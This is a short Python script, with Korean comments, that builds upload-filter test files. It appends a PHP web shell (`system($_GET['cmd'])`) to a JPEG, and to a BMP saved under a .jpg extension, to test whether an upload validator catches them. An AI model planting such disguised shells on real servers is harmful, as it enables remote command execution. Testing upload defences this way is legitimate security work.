from PIL import Image

def create_stealth_webshell_image(original_image_path):
    """
    공격 패턴 3-1: 정상적인 이미지 파일(JPEG) 끝에 악성 스크립트 숨기기
    """
    output_name = "hack_test_stealth.jpg"
    try:
        with open(original_image_path, "rb") as f:
            image_data = f.read()
    except FileNotFoundError:
        print(f"❌ '{original_image_path}' 파일을 찾을 수 없습니다.")
        return

    with open(output_name, "wb") as f:
        f.write(image_data)
        fake_payload = b"\n<?php system($_GET['cmd']); ?>\n"
        f.write(fake_payload)
        
    print(f"🧨 스텔스 테스트 파일(JPEG) 생성 완료: {output_name}")

def create_bmp_as_jpg_stealth_image(original_image_path):
    """
    공격 패턴 3-2: 내부 포맷은 BMP인데 확장자만 .jpg로 위장 + 악성 스크립트 숨기기
    설명: 확장자만 보고 검증하는 허술한 방어막을 뚫기 위한 기법입니다.
    """
    output_name = "hack_test_unallowed_format.jpg"
    
    # 1. Pillow를 사용해 원본 이미지를 엽니다.
    try:
        with Image.open(original_image_path) as img:
            # 🌟 핵심: 진짜 포맷은 'BMP'로 변환하지만, 저장되는 파일명은 '.jpg'로 속여서 저장합니다.
            img.save(output_name, format="BMP")
    except FileNotFoundError:
        print(f"❌ '{original_image_path}' 파일을 찾을 수 없습니다.")
        return

    # 2. 저장된 파일 끝에 악성 웹셸 스크립트를 이어 붙입니다(Append 모드 'ab').
    with open(output_name, "ab") as f:
        fake_payload = b"\n<?php system($_GET['cmd']); ?>\n"
        f.write(fake_payload)
        
    print(f"🧨 확장자 위장(내부BMP -> 겉.jpg) 스텔스 테스트 파일 생성 완료: {output_name}")

if __name__ == "__main__":
    print("🛡️ 고급 시큐어 코딩 테스트용 스텔스 파일 생성을 시작합니다...")
    
    # 첨부해주신 알약 사진의 파일명으로 지정합니다.
    target_image = "sample_pills2.jpg"
    
    create_stealth_webshell_image(target_image)
    
    # 새롭게 추가된 확장자 위장 테스트 함수 호출!
    create_bmp_as_jpg_stealth_image(target_image)
    
    print("✅ 생성 완료! 만들어진 파일들을 Streamlit에 업로드하여 방어 로직을 테스트해 보세요!")